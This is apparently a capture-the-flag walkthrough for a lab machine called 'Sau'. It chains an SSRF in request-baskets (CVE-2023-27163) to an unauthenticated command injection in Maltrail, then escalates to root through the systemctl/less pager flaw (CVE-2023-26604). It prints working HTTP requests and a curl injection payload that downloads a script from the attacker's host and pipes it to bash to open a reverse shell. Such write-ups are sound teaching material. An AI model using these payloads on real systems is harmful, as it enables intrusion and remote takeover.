# Sau

## Enumeration:

Start off with an nmap scan:
```vim
┌──(kali㉿kali)-[~/sau]
└─$ nmap -sV -sC -Pn -v -p- --min-rate=10000 10.10.11.224
Nmap scan report for 10.10.11.224
Host is up (0.19s latency).
Not shown: 64886 closed tcp ports (conn-refused), 647 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
55555/tcp open  unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Sun, 09 Jul 2023 09:37:55 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Sun, 09 Jul 2023 09:37:25 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Sun, 09 Jul 2023 09:37:26 GMT
|_    Content-Length: 0
```

This reveals port 55555 which seems to have a redirect to `/web` so I am sure its a webserver.

Looking at the webpage, you can see `requests-basket v1.2.1` in the footer. I found the [Github](https://github.com/darklynx/request-baskets/tree/v1.2.1) for it and started to look for vulnerabilities. 

## Exploit:

I found this article about [CVE-2023-27163](https://notes.sjtu.edu.cn/s/MUUhEymt7#) which talks about an SSRF vulnerability in the `/api/baskets/{name}` endpoint with its `forward_url` parameter (and the `proxy_response` parameter has to be set to true to view the responses)

Make the following POST request in order to make a basket and to set the parameters at the same time:

```http
POST /api/baskets/lmao HTTP/1.1
Host: 10.10.11.224:55555
Content-Length: 115
Accept: */*
X-Requested-With: XMLHttpRequest
Authorization: null
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Content-Type: application/json
Origin: http://10.10.11.224:55555
Referer: http://10.10.11.224:55555/web
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"forward_url":"http://127.0.0.1:80","proxy_response":true,"insecure_tls":false,"expand_path":false,"capacity":200}
```

Now, any requests made to `http://10.10.11.224:55555/lmao` will be forwarded to `http://127.0.0.1:80` and we can view what is there (I tried the `file:///` protocol but it wasn't supported).

Visiting `http://10.10.11.224:55555/lmao` shows us a webapp which has the following in its footer: `Powered by Maltrail (v0.53)`

I look for exploits regarding Maltrail and find the following: https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/

The above article talks about an unauthenticated command injection vulnerability in the `/login` endpoint.

Send the following HTTP request to update the config of the lmao bucket in order to forward requests to the `/login` endpoint:

```http
PUT /api/baskets/lmao HTTP/1.1
Host: 10.10.11.224:55555
Content-Length: 121
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Authorization: 3x-y26Lk3qN9yVWgI8S2K5KJoFLPyflx-abLSfHOb57D
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://10.10.11.224:55555
Referer: http://10.10.11.224:55555/web/lmao
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"forward_url":"http://127.0.0.1:80/login","proxy_response":true,"insecure_tls":false,"expand_path":false,"capacity":200}
```

We can make the following request with cURL to exploit it: 
```vim
curl 'http://10.10.11.224:55555/lmao' --data 'username=;`curl http://10.10.14.21:8000/script.sh | bash`'
```

You will need to have a Simple web server set up with `python -m http.server 8000` containing `script.sh` which contains a normal bash reverse shell and have a netcat listener on port 9000.

Sending the cURL command through, we will get access to the machine with the `puma` user. Use `ssh-keygen` to set up the ssh keys and get an SSH connection.

User Flag is in `/home/puma/user.txt`

## Privilege Escalation:

Run `sudo -l` and we see the following output:

```vim
puma@sau:/dev/shm$ sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

This says that we can run the `systemctl` command as root, however since we have extra parameters set, we can't use any GTFObins route. Looking further into exploits, I found the following article about [CVE-2023-26604](https://securityonline.info/cve-2023-26604-systemd-privilege-escalation-flaw-affects-linux-distros).

This CVE talks about how, prior to `systemd v247`, `systemctl` would run `cat` to display the output, however if the terminal size is too small, then it will use the `less` pager to show output. Since `systemctl` is being run as root, we can exploit the `less` command by making the terminal size really small and then running `!`. This will give you a root shell.

Root flag can be found in `root.txt`
